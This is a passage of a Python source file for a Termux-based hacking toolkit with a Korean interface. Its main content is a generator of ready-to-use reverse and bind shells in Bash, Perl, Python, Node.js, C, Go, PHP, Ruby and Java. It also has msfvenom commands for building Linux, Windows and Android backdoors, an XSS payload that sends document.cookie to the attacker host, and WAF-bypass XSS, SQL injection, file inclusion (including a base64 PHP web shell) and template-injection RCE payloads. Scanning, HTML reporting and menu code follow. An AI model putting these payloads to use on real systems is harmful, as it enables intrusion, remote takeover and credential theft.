            "Netcat FIFO": f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f",
            "Netcat Traditional": f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f",
            "Netcat -e (deprecated)": f"nc {lhost} {lport} -e /bin/sh",
            "Socat": f"socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{lhost}:{lport}",
            "Perl": f"perl -e 'use Socket;$i=\"{lhost}\";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'",
        }

    @staticmethod
    def get_python_payloads(lhost, lport):
        return {
            "Python2 Standard": f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
            "Python3 Short": f"python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"{lhost}\",{lport}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"/bin/sh\")'",
            "Python Export": f"export RHOST=\"{lhost}\";export RPORT={lport};python -c 'import sys,os,socket,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")'",
            "Python Windows (cmd.exe)": f"python -c \"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('{lhost}',{lport}));subprocess.call(['cmd.exe'],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())\""
        }

    @staticmethod
    def get_javascript_payloads(lhost, lport):
        return {
            "Node.js Standard": f"require('child_process').exec('nc -e /bin/sh {lhost} {lport}')",
            "Node.js Net Module": f"(function(){{ var net = require('net'), cp = require('child_process'), sh = cp.spawn('/bin/sh', []); var client = new net.Socket(); client.connect({lport}, '{lhost}', function(){{ client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); }}); return /a/; }})();",
            "XSS Alert": f"<script>alert('XSS')</script>",
            "XSS Image Error": f"<img src=x onerror=alert('XSS')>",
            "XSS Fetch Cookie": f"<script>fetch('http://{lhost}:{lport}/?cookie='+document.cookie)</script>"
        }

    @staticmethod
    def get_c_payloads(lhost, lport):
        code = f"""
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int main(void) {{
    int sockfd;
    int lport = {lport};
    struct sockaddr_in serv_addr;
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(lport);
    serv_addr.sin_addr.s_addr = inet_addr("{lhost}");
    connect(sockfd, (struct sockaddr *)&serv_addr, sizeof(serv_addr));
    dup2(sockfd, 0);
    dup2(sockfd, 1);
    dup2(sockfd, 2);
    execve("/bin/sh", NULL, NULL);
    return 0;
}}
"""
        return {"C Reverse Shell Source": code, "Compile Command": f"gcc shell.c -o shell"}

    @staticmethod
    def get_java_payloads(lhost, lport):
        return {
            "Java Runtime Exec (Linux)": f"Runtime.getRuntime().exec(\"bash -c 'exec 5<>/dev/tcp/{lhost}/{lport};cat <&5 | while read line; do \$line 2>&5 >&5; done'\");",
            "Java Runtime Exec (Netcat)": f"Runtime.getRuntime().exec(\"nc {lhost} {lport} -e /bin/sh\");",
            "Java ProcessBuilder": f"Process p = new ProcessBuilder(\"/bin/sh\", \"-i\").redirectErrorStream(true).start(); Socket s = new Socket(\"{lhost}\", {lport});"
        }

    @staticmethod
    def get_go_payloads(lhost, lport):
        code = f"""
package main;
import ("net";"os/exec");
func main() {{
    c, _ := net.Dial("tcp", "{lhost}:{lport}");
    cmd := exec.Command("/bin/sh");
    cmd.Stdin = c;
    cmd.Stdout = c;
    cmd.Stderr = c;
    cmd.Run();
}}
"""
        return {"Go Reverse Shell Source": code, "Compile Command": "go build shell.go", "Run Command": "./shell"}

    @staticmethod
    def get_php_payloads(lhost, lport):
        return {
            "PHP Exec": f"php -r '$sock=fsockopen(\"{lhost}\",{lport});exec(\"sh <&3 >&3 2>&3\");'",
            "PHP Shell_exec": f"<?php shell_exec(\"nc {lhost} {lport} -e /bin/sh\"); ?>",
            "PHP System": f"<?php system(\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f\"); ?>",
            "PHP PentestMonkey": f"<?php $sock=fsockopen(\"{lhost}\",{lport});$proc=proc_open(\"/bin/sh -i\", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes); ?>"
        }

    @staticmethod
    def get_csharp_payloads(lhost, lport):
        code = f"""
using System;
using System.Net.Sockets;
using System.IO;
using System.Diagnostics;

class Shell {{
    static void Main() {{
        using (TcpClient client = new TcpClient("{lhost}", {lport})) {{
            using (Stream stream = client.GetStream()) {{
                using (StreamReader reader = new StreamReader(stream)) {{
                    using (StreamWriter writer = new StreamWriter(stream)) {{
                        Process p = new Process();
                        p.StartInfo.FileName = "cmd.exe"; // For Windows
                        // For Linux/macOS, use "/bin/bash" or "/bin/sh"
                        // p.StartInfo.FileName = "/bin/bash";
                        p.StartInfo.CreateNoWindow = true;
                        p.StartInfo.UseShellExecute = false;
                        p.StartInfo.RedirectStandardInput = true;
                        p.StartInfo.RedirectStandardOutput = true;
                        p.StartInfo.RedirectStandardError = true;
                        p.Start();

                        // Redirect input/output
                        writer.WriteLine("whoami"); // Example command
                        writer.Flush();
                        string response = reader.ReadToEnd();
                        Console.WriteLine(response);

                        // More robust shell handling would involve a loop
                        // and sending commands from the listener.
                    }}
                }}
            }}
        }}
    }}
}}
"""
        return {"C# Reverse Shell (Conceptual)": code, "Compile Command": "csc Shell.cs", "Run Command": "Shell.exe"}

    @staticmethod
    def get_ruby_payloads(lhost, lport):
        return {
            "Ruby Standard": f"ruby -rsocket -e'f=TCPSocket.open(\"{lhost}\",{lport}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
            "Ruby No-Exec": f"ruby -rsocket -e'exit if fork;c=TCPSocket.new(\"{lhost}\",\"{lport}\");while(cmd=c.gets);IO.popen(cmd,\"r\"){{|io|c.print io.read}}end'"
        }

    @staticmethod
    def get_perl_payloads(lhost, lport):
        return {
            "Perl Standard": f"perl -e 'use Socket;$i=\"{lhost}\";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};';",
            "Perl No-SH": f"perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"{lhost}:{lport}\");while(<$c>){{print $c `$_`}}\'"
        }

    @staticmethod
    def get_bind_shell_payloads(lport):
        return {
            "Netcat Classic": f"nc -lvnp {lport} -e sh",
            "Python Bind Shell": f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind((\"0.0.0.0\",{lport}));s.listen(1);c,a=s.accept();os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);import pty;pty.spawn(\"sh\")'",
            "Netcat FIFO (우회형)": f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc -lvnp {lport} >/tmp/f"
        }

    @staticmethod
    def get_meterpreter_guideline(lhost, lport):
        guideline = f"""
{Colors.GREEN}[*] Meterpreter Payload Generation Guide (msfvenom & msfconsole){Colors.RESET}

1. Linux Target (ELF Executable):
   $ msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f elf > shell.elf

2. Windows Target (EXE Executable):
   $ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f exe > shell.exe

3. Android Target (APK Package):
   $ msfvenom -p android/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} R > backdoor.apk

4. Multi/Handler Listener Setup (msfconsole):
   $ msfconsole
   msf6 > use exploit/multi/handler
   msf6 exploit(multi/handler) > set PAYLOAD <선택한_페이로드>
   msf6 exploit(multi/handler) > set LHOST {lhost}
   msf6 exploit(multi/handler) > set LPORT {lport}
   msf6 exploit(multi/handler) > exploit -j
"""
        return guideline

    @staticmethod
    def show_termux_constraints():
        constraints = f"""
{Colors.YELLOW}[!] Termux 환경에서의 페이로드 바인딩 및 공격 모듈 제약사항 안내{Colors.RESET}

1. {Colors.BOLD}비루트(Non-root) 포트 바인딩 제한{Colors.RESET}
   - Termux는 기본적으로 루팅되지 않은 안드로이드 환경에서 실행됩니다.
   - 따라서 {Colors.RED}1024 이하의 Well-known 포트(예: 80, 443, 22 등)는 바인딩할 수 없습니다.{Colors.RESET}
   - 리스너(Listener)를 구동할 때는 항상 1024 이상의 포트(예: 4444, 8080)를 사용해야 합니다.

2. {Colors.BOLD}SELinux 및 안드로이드 보안 정책{Colors.RESET}
   - 최신 안드로이드 OS의 SELinux 강제 정책으로 인해, Termux 내에서 특정 시스템 호출이나 원격 쉘 실행이 제한될 수 있습니다.
   - 쉘 실행 시 아키텍처 불일치(AArch64 vs x86/x64)로 컴파일된 바이너리가 실행되지 않을 수 있으므로, Python/Bash 기반 페이로드를 권장합니다.

3. {Colors.BOLD}안드로이드 전력 관리(배터리 최적화) 정책{Colors.RESET}
   - 백그라운드에서 실행되는 리버스 쉘이나 리스너가 안드로이드 OS의 절전 기능에 의해 강제 종료될 수 있습니다.
   - 지속적인 연결을 위해서는 Termux 앱 설정에서 '배터리 최적화 예외'를 설정해야 합니다.

4. {Colors.BOLD}개념 증명(PoC) 한계 및 안전 권고{Colors.RESET}
   - 본 도구의 페이로드 생성 기능은 오직 {Colors.GREEN}학습 및 모의 침투 테스트(PoC) 목적{Colors.RESET}으로만 설계되었습니다.
   - 인가되지 않은 외부 대상에 대한 페이로드 주입 및 쉘 획득 시도는 정보통신망법 위반으로 엄격히 처벌받을 수 있습니다.
"""
        return constraints

# --- 웹 해킹 및 우회 페이로드 (추가 및 강화) ---

def xss_payload_generator():
    """다양한 언어와 우회 기법을 섞은 XSS 페이로드"""
    return {
        "Basic Alert": "<script>alert(1)</script>",
        "Img Error": "<img src=x onerror=alert(1)>",
        "SVG Load": "<svg onload=alert(1)>",
        "Body Onload": "<body onload=alert(1)>",
        "JavaScript Link": "javascript:alert(1)",
        "WAF Bypass (Hex)": "<script>eval('\\x61\\x6c\\x65\\x72\\x74\\x28\\x31\\x29')</script>",
        "WAF Bypass (Base64)": "<script>eval(atob('YWxlcnQoMSk='))</script>",
        "HTML Entity Bypass": "<img src=x &#x6F;&#x6E;&#x65;&#x72;&#x72;&#x6F;&#x72;=alert(1)>",
        "Double Encoded": "%253Cscript%253Ealert(1)%253C%252Fscript%253E"
    }

def sqli_payload_generator():
    """SQL 인젝션 언어별/DB별 페이로드"""
    return {
        "Generic Error-Based": "' OR 1=1 --",
        "MySQL Error-Based": "' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, (SELECT table_name FROM information_schema.tables LIMIT 0,1), 0x7e)x FROM information_schema.tables GROUP BY x)a) --",
        "PostgreSQL Time-Based Blind": "'; SELECT pg_sleep(5) --",
        "MSSQL Time-Based Blind": "'; WAITFOR DELAY '0:0:5' --",
        "SQLite Version": "' UNION SELECT sqlite_version(), NULL --",
        "Boolean-Based Blind": "' AND 1=1 --",
        "Stacked Queries (MSSQL)": "; SELECT @@version --"
    }

def lfi_rfi_payload_generator():
    """Local/Remote File Inclusion 페이로드"""
    return {
        "Basic LFI (Linux)": "../../../../etc/passwd",
        "Basic LFI (Windows)": "../../../../windows/win.ini",
        "LFI with Null Byte": "../../../../etc/passwd%00",
        "PHP Filter LFI": "php://filter/convert.base64-encode/resource=index.php",
        "Data URI RFI": "data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWzBdKTsgPz4=", # <?php system($_GET[0]); ?>
        "Expect RFI": "expect://id"
    }

def ssti_payload_generator():
    """Server Side Template Injection 페이로드"""
    return {
        "Jinja2 (Python)": "{{ 7*7 }}",
        "Jinja2 RCE": "{{ ''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read() }}", # Example path, index might vary
        "Twig (PHP)": "{{_self.env.execute('id')}}",
        "Smarty (PHP)": "{system('id')}",
        "Freemarker (Java)": "${'freemarker.template.utility.Execute'?new()('id')}",
        "Velocity (Java)": "#set($x=$request.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('id'))"
    }

# --- Main Scan & HTML Report Generation (기존 기능 통합) ---

def generate_html_report(target, data):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    filename = f"report_{target.replace('.', '_')}_{datetime.now().strftime('%Y%m%d%H%M%S')}.html"
    
    tech_html = ""
    if "Web Tech" in data and isinstance(data["Web Tech"], dict):
        colors = ["#ff4500", "#8a2be2", "#5f9ea0", "#ffd700", "#adff2f", "#ff69b4"]
        i = 0
        tech_items = []
        for k, v in data["Web Tech"].items():
            tech_items.append(f'<li><span class="dot" style="background-color:{colors[i % len(colors)]}"></span> <strong>{k}</strong>: {v}</li>')
            i += 1
        tech_html = "<ul>" + "".join(tech_items) + "</ul>"
    elif "Web Tech" in data:
        tech_html = f"<p>{data['Web Tech']}</p>"

    def sj(val):
        return json.dumps(val, indent=4, ensure_ascii=False)

    html_content = f"""
<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <title>Comprehensive OSINT & Security Report - {target}</title>
    <style>
        body {{ font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #0d1117; color: #c9d1d9; padding: 20px; line-height: 1.6; }}
        .container {{ max-width: 1000px; margin: auto; background: #161b22; padding: 30px; border-radius: 10px; box-shadow: 0 4px 10px rgba(0,0,0,0.5); }}
        h1 {{ color: #58a6ff; border-bottom: 1px solid #30363d; padding-bottom: 10px; text-align: center; }}
        h2 {{ color: #f0883e; margin-top: 30px; border-bottom: 1px dashed #30363d; padding-bottom: 5px; }}
        h3 {{ color: #79c0ff; margin-top: 20px; }}
        .section {{ margin-bottom: 25px; padding: 15px; background: #0d1117; border-radius: 8px; border: 1px solid #30363d; }}
        .subsection {{ margin-left: 20px; margin-top: 10px; padding: 10px; background: #010409; border-left: 3px solid #f0883e; border-radius: 5px; }}
        ul {{ list-style: none; padding: 0; margin: 0; }}
        li {{ display: flex; align-items: center; font-size: 0.95em; margin-bottom: 5px; }}
        .dot {{ width: 10px; height: 10px; border-radius: 50%; margin-right: 8px; flex-shrink: 0; }}
        pre {{ background: #010409; padding: 15px; border-radius: 5px; overflow-x: auto; color: #8b949e; font-size: 0.85em; white-space: pre-wrap; word-wrap: break-word; border: 1px solid #30363d; }}
        .footer {{ text-align: center; margin-top: 40px; font-size: 0.8em; color: #8b949e; }}
    </style>
</head>
<body>
    <div class="container">
        <h1>Comprehensive OSINT & Security Report</h1>
        <p><strong>Target:</strong> {target} | <strong>Scan Time:</strong> {timestamp}</p>
        
        <div class="section">
            <h2>1. Information Gathering</h2>
            <div class="subsection"><h3>WHOIS Information</h3><pre>{data.get('Whois', 'No data')}</pre></div>
            <div class="subsection"><h3>DNS Information</h3><pre>{sj(data.get('DNS', {}))}</pre></div>
            <div class="subsection"><h3>IP Geolocation</h3><pre>{sj(data.get('Geolocation', {}))}</pre></div>
            <div class="subsection"><h3>Subdomain Finder</h3><pre>{sj(data.get('Subdomain Finder', {}))}</pre></div>
            <div class="subsection"><h3>Email Harvester</h3><pre>{sj(data.get('Email Harvester', {}))}</pre></div>
            <div class="subsection"><h3>SSL Certificate Info</h3><pre>{sj(data.get('SSL Certificate Info', {}))}</pre></div>
            <div class="subsection"><h3>Reverse IP & Shared Hosting</h3><pre>{sj(data.get('Reverse IP', {}))}</pre></div>
            <div class="subsection"><h3>Google Dorks</h3><pre>{sj(data.get('Google Dorks', {}))}</pre></div>
        </div>

        <div class="section">
            <h2>2. Web Analysis & Vulnerabilities</h2>
            <div class="subsection"><h3>Web Technology Stack</h3>{tech_html}</div>
            <div class="subsection"><h3>WAF Detection</h3><pre>{sj(data.get('WAF Detection', {}))}</pre></div>
            <div class="subsection"><h3>Security Headers</h3><pre>{sj(data.get('Security Headers', {}))}</pre></div>
            <div class="subsection"><h3>Clickjacking Test</h3><p>{data.get('Clickjacking Test', 'No data')}</p></div>
            <div class="subsection"><h3>Open Redirect Check</h3><p>{data.get('Open Redirect Check', 'No data')}</p></div>
            <div class="subsection"><h3>CORS Misconfiguration Check</h3><p>{data.get('CORS Misconfiguration', 'No data')}</p></div>
            <div class="subsection"><h3>Robots.txt Analysis</h3><pre>{sj(data.get('Robots.txt Analysis', {}))}</pre></div>
            <div class="subsection"><h3>Sitemap.xml Finder</h3><pre>{sj(data.get('Sitemap.xml Finder', {}))}</pre></div>
            <div class="subsection"><h3>XSS & SQLi Scanner (PoC)</h3><pre>{sj(data.get('XSS & SQLi Scan', {}))}</pre></div>
            <div class="subsection"><h3>CMS Scanner & Version Analysis</h3><pre>{sj(data.get('CMS Scan', {}))}</pre></div>
        </div>

        <div class="section">
            <h2>3. Network Security</h2>
            <div class="subsection"><h3>Port Scan</h3><pre>{sj(data.get('Port Scan', {}))}</pre></div>
            <div class="subsection"><h3>Service Version Detection (Banner Grabbing)</h3><pre>{sj(data.get('Service Versions', {}))}</pre></div>
            <div class="subsection"><h3>FTP Anonymous Login Check</h3><p>{data.get('FTP Anonymous Login', 'No data')}</p></div>
            <div class="subsection"><h3>Traceroute</h3><pre>{data.get('Traceroute', 'No data')}</p></div>
            <div class="subsection"><h3>Ping Sweep</h3><pre>{sj(data.get('Ping Sweep', {}))}</pre></div>
            <div class="subsection"><h3>Network Latency Check</h3><pre>{sj(data.get('Network Latency', {}))}</pre></div>
        </div>

        <div class="footer">Generated by Termux OSINT & Security Framework v3.0</div>
    </div>
</body>
</html>
    """
    with open(filename, "w", encoding="utf-8") as f:
        f.write(html_content)
    return filename

def run_full_scan(target):
    print(f"{Colors.GREEN}[*] 종합 스캔 시작: {target}{Colors.RESET}")
    data = {}
    
    print(f"{Colors.YELLOW}[1/5] 정보 수집 중...{Colors.RESET}")
    data["Whois"] = get_whois_info(target)
    dns_info = get_dns_info(target)
    data["DNS"] = dns_info
    ip = dns_info.get("IP Address") if isinstance(dns_info, dict) else None
    data["Subdomain Finder"] = subdomain_finder(target) if not is_ip_address(target) else "N/A"
    data["Email Harvester"] = email_harvester(target) if not is_ip_address(target) else "N/A"
    data["Google Dorks"] = google_dork_generator(target) if not is_ip_address(target) else "N/A"

    if ip:
        data["Geolocation"] = get_ip_geolocation(ip)
        data["Reverse IP"] = reverse_ip_lookup(ip)
    else:
        data["Geolocation"] = "IP 주소를 찾을 수 없어 건너뜁니다."
        data["Reverse IP"] = "IP 주소를 찾을 수 없어 건너뜁니다."

    print(f"{Colors.YELLOW}[2/5] 웹 분석 및 고도화 취약점 스캔 중...{Colors.RESET}")
    data["Web Tech"] = web_tech_detector(target)
    data["WAF Detection"] = waf_detector(target)
    data["Security Headers"] = security_headers_check(target)
    data["Clickjacking Test"] = clickjacking_test(target)
    data["Open Redirect Check"] = open_redirect_check(target)
    data["CORS Misconfiguration"] = cors_misconfiguration_check(target)
    data["Robots.txt Analysis"] = robots_txt_analyzer(target)
    data["Sitemap.xml Finder"] = sitemap_xml_finder(target)
    data["SSL Certificate Info"] = get_ssl_info(target) if not is_ip_address(target) else "N/A"
    data["XSS & SQLi Scan"] = xss_sqli_scanner(target)
    data["CMS Scan"] = cms_scanner(target)

    print(f"{Colors.YELLOW}[3/5] 네트워크 보안 분석 및 서비스 버전 감지 중...{Colors.RESET}")
    if ip:
        common_ports = [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445, 3389, 8080]
        data["Port Scan"] = port_scanner(ip, common_ports)
        data["Service Versions"] = service_version_detection(ip, [21, 22, 23, 80, 443, 8080])
        data["FTP Anonymous Login"] = ftp_anonymous_login_check(ip)
        data["Traceroute"] = traceroute(ip)
        data["Ping Sweep"] = ping_sweep(ip.rsplit('.', 1)[0] + '.1', ip.rsplit('.', 1)[0] + '.10')
        data["Network Latency"] = network_latency_check(ip)
    else:
        data["Port Scan"] = "IP 주소를 찾을 수 없어 건너뜁니다."
        data["Service Versions"] = "IP 주소를 찾을 수 없어 건너뜀니다."
        data["FTP Anonymous Login"] = "IP 주소를 찾을 수 없어 건너뜁니다."
        data["Traceroute"] = "IP 주소를 찾을 수 없어 건너뜁니다."
        data["Ping Sweep"] = "IP 주소를 찾을 수 없어 건너뜁니다."
        data["Network Latency"] = "IP 주소를 찾을 수 없어 건너뜁니다."

    print(f"{Colors.YELLOW}[4/5] 보고서 생성 중...{Colors.RESET}")
    report_file = generate_html_report(target, data)
    
    print(f"\n{Colors.GREEN}{Colors.BOLD}[+] 스캔 완료!{Colors.RESET}")
    print(f"{Colors.WHITE}결과 보고서가 저장되었습니다: {Colors.YELLOW}{report_file}{Colors.RESET}")
    print(f"{Colors.WHITE}Termux에서 'termux-open {report_file}' 명령어로 브라우저에서 확인할 수 있습니다.{Colors.RESET}")

def run_individual_scan(scan_type, target):
    print(f"{Colors.GREEN}[+] 대상: {target}{Colors.RESET}")
    print(f"{Colors.MAGENTA}{Colors.BOLD}=============================={Colors.RESET}")
    result = ""
    if scan_type == "WHOIS":
        result = get_whois_info(target)
    elif scan_type == "DNS":
        result = get_dns_info(target)
    elif scan_type == "Geolocation":
        ip = target if is_ip_address(target) else get_dns_info(target).get("IP Address")
        result = get_ip_geolocation(ip) if ip else "IP 주소를 찾을 수 없습니다."
    elif scan_type == "Subdomain":
        result = subdomain_finder(target)
    elif scan_type == "Email Harvester":
        result = email_harvester(target)
    elif scan_type == "SSL Info":
        result = get_ssl_info(target)
    elif scan_type == "Reverse IP":
        result = reverse_ip_lookup(target)
    elif scan_type == "Google Dorks":
        result = google_dork_generator(target)
    elif scan_type == "Web Tech":
        result = web_tech_detector(target)
    elif scan_type == "WAF":
        result = waf_detector(target)
    elif scan_type == "Security Headers":
        result = security_headers_check(target)
    elif scan_type == "Clickjacking":
        result = clickjacking_test(target)
    elif scan_type == "Open Redirect":
        result = open_redirect_check(target)
    elif scan_type == "CORS":
        result = cors_misconfiguration_check(target)
    elif scan_type == "Robots.txt":
        result = robots_txt_analyzer(target)
    elif scan_type == "Sitemap":
        result = sitemap_xml_finder(target)
    elif scan_type == "XSS/SQLi Scan":
        result = xss_sqli_scanner(target)
    elif scan_type == "CMS Scan":
        result = cms_scanner(target)
    elif scan_type == "Port Scan":
        ports_input = input(f"{Colors.CYAN}스캔할 포트 (쉼표로 구분, 예: 80,443,22): {Colors.RESET}").strip()
        ports = [int(p.strip()) for p in ports_input.split(",")] if ports_input else [80, 443]
        ip = target if is_ip_address(target) else get_dns_info(target).get("IP Address")
        result = port_scanner(ip, ports) if ip else "IP 주소를 찾을 수 없습니다."
    elif scan_type == "Service Version":
        ports_input = input(f"{Colors.CYAN}버전을 가져올 포트 (쉼표로 구분, 예: 21,22,80): {Colors.RESET}").strip()
        ports = [int(p.strip()) for p in ports_input.split(",")] if ports_input else [21, 22, 80, 443]
        ip = target if is_ip_address(target) else get_dns_info(target).get("IP Address")
        result = service_version_detection(ip, ports) if ip else "IP 주소를 찾을 수 없습니다."
    elif scan_type == "FTP Anon Login":
        ip = target if is_ip_address(target) else get_dns_info(target).get("IP Address")
        result = ftp_anonymous_login_check(ip) if ip else "IP 주소를 찾을 수 없습니다."
    elif scan_type == "Traceroute":
        result = traceroute(target)
    elif scan_type == "Ping Sweep":
        ip_range_start = input(f"{Colors.CYAN}시작 IP (예: 192.168.1.1): {Colors.RESET}").strip()
        ip_range_end = input(f"{Colors.CYAN}끝 IP (예: 192.168.1.10): {Colors.RESET}").strip()
        result = ping_sweep(ip_range_start, ip_range_end)
    elif scan_type == "Latency Check":
        result = network_latency_check(target)
    
    print_result(scan_type + " 결과", result)
    print(f"{Colors.MAGENTA}{Colors.BOLD}=============================={Colors.RESET}")

# --- 메뉴 출력 및 컨트롤 로직 ---

def display_main_menu():
    print_banner()
    print(f"{Colors.YELLOW}{Colors.BOLD}메인 메뉴:{Colors.RESET}")
    print(f"{Colors.GREEN}  1. 종합 OSINT & 보안 스캔 (HTML 보고서 생성){Colors.RESET}")
    print(f"{Colors.GREEN}  2. 정보 수집 도구{Colors.RESET}")
    print(f"{Colors.GREEN}  3. 웹 분석 및 고도화 취약점 스캔 도구{Colors.RESET}")
    print(f"{Colors.GREEN}  4. 네트워크 및 시스템 분석 도구{Colors.RESET}")
    print(f"{Colors.GREEN}  5. 암호학 & 유틸리티{Colors.RESET}")
    print(f"{Colors.GREEN}  6. 멀티 언어 공격 모듈 및 페이로드 생성기{Colors.RESET}")
    print(f"{Colors.GREEN}  7. 도움말{Colors.RESET}")
    print(f"{Colors.RED}  0. 종료{Colors.RESET}")
    print(f"{Colors.MAGENTA}{Colors.BOLD}====================================================={Colors.RESET}")

def display_info_gathering_menu():
    print_banner()
    print(f"{Colors.YELLOW}{Colors.BOLD}정보 수집 도구:{Colors.RESET}")
    print(f"{Colors.GREEN}  2.1. WHOIS 정보 조회{Colors.RESET}")
    print(f"{Colors.GREEN}  2.2. DNS 정보 조회{Colors.RESET}")
    print(f"{Colors.GREEN}  2.3. IP 지리적 위치 조회{Colors.RESET}")
    print(f"{Colors.GREEN}  2.4. 서브도메인 찾기{Colors.RESET}")
    print(f"{Colors.GREEN}  2.5. 이메일 수집기{Colors.RESET}")
    print(f"{Colors.GREEN}  2.6. SSL 인증서 정보{Colors.RESET}")
    print(f"{Colors.GREEN}  2.7. 역방향 IP & 공유 호스팅 조회{Colors.RESET}")
    print(f"{Colors.GREEN}  2.8. Google Dork 생성기{Colors.RESET}")
    print(f"{Colors.BLUE}  B. 뒤로 가기{Colors.RESET}")
    print(f"{Colors.RED}  0. 종료{Colors.RESET}")
    print(f"{Colors.MAGENTA}{Colors.BOLD}====================================================={Colors.RESET}")

def display_web_analysis_menu():
    print_banner()
    print(f"{Colors.YELLOW}{Colors.BOLD}웹 분석 및 고도화 취약점 스캔 도구:{Colors.RESET}")
    print(f"{Colors.GREEN}  3.1. 웹 기술 스택 분석{Colors.RESET}")
    print(f"{Colors.GREEN}  3.2. WAF 감지{Colors.RESET}")
    print(f"{Colors.GREEN}  3.3. 보안 헤더 체크{Colors.RESET}")
    print(f"{Colors.GREEN}  3.4. Clickjacking 테스트{Colors.RESET}")
    print(f"{Colors.GREEN}  3.5. Open Redirect 체크{Colors.RESET}")
    print(f"{Colors.GREEN}  3.6. CORS 취약점 체크{Colors.RESET}")
    print(f"{Colors.GREEN}  3.7. Robots.txt 분석{Colors.RESET}")
    print(f"{Colors.GREEN}  3.8. Sitemap.xml 찾기{Colors.RESET}")
    print(f"{Colors.GREEN}  3.9. XSS/SQLi 스캐너 고도화{Colors.RESET}")
    print(f"{Colors.GREEN}  3.10. 디렉토리 브루트포싱 (사용자 정의 지원){Colors.RESET}")
    print(f"{Colors.GREEN}  3.11. CMS 취약점 스캐너{Colors.RESET}")
    print(f"{Colors.GREEN}  3.12. Exploit-DB 검색{Colors.RESET}")
    print(f"{Colors.BLUE}  B. 뒤로 가기{Colors.RESET}")
    print(f"{Colors.RED}  0. 종료{Colors.RESET}")
    print(f"{Colors.MAGENTA}{Colors.BOLD}====================================================={Colors.RESET}")

def display_network_security_menu():
    print_banner()
    print(f"{Colors.YELLOW}{Colors.BOLD}네트워크 및 시스템 분석 도구:{Colors.RESET}")
    print(f"{Colors.GREEN}  4.1. 포트 스캔{Colors.RESET}")
    print(f"{Colors.GREEN}  4.2. 서비스 버전 감지 (정밀 배너 그래빙){Colors.RESET}")
    print(f"{Colors.GREEN}  4.3. FTP 익명 로그인 체크{Colors.RESET}")
    print(f"{Colors.GREEN}  4.4. Traceroute{Colors.RESET}")
    print(f"{Colors.GREEN}  4.5. Ping Sweep{Colors.RESET}")
    print(f"{Colors.GREEN}  4.6. 네트워크 지연 시간 체크{Colors.RESET}")
    print(f"{Colors.BLUE}  B. 뒤로 가기{Colors.RESET}")
    print(f"{Colors.RED}  0. 종료{Colors.RESET}")
    print(f"{Colors.MAGENTA}{Colors.BOLD}====================================================={Colors.RESET}")

def display_crypto_utilities_menu():
    print_banner()
    print(f"{Colors.YELLOW}{Colors.BOLD}암호학 & 유틸리티:{Colors.RESET}")
    print(f"{Colors.GREEN}  5.1. 해시 생성기{Colors.RESET}")
    print(f"{Colors.GREEN}  5.2. 해시 식별기{Colors.RESET}")
    print(f"{Colors.GREEN}  5.3. Base64 인코더/디코더{Colors.RESET}")
    print(f"{Colors.GREEN}  5.4. URL 인코더/디코더{Colors.RESET}")
    print(f"{Colors.GREEN}  5.5. 패스워드 생성기{Colors.RESET}")
    print(f"{Colors.GREEN}  5.6. IP 계산기{Colors.RESET}")
    print(f"{Colors.GREEN}  5.7. Epoch 변환기{Colors.RESET}")
    print(f"{Colors.GREEN}  5.8. 해시 크래커 (딕셔너리 기반){Colors.RESET}")
    print(f"{Colors.GREEN}  5.9. 패스워드 리스트 생성기 (조합형){Colors.RESET}")
    print(f"{Colors.BLUE}  B. 뒤로 가기{Colors.RESET}")
    print(f"{Colors.RED}  0. 종료{Colors.RESET}")
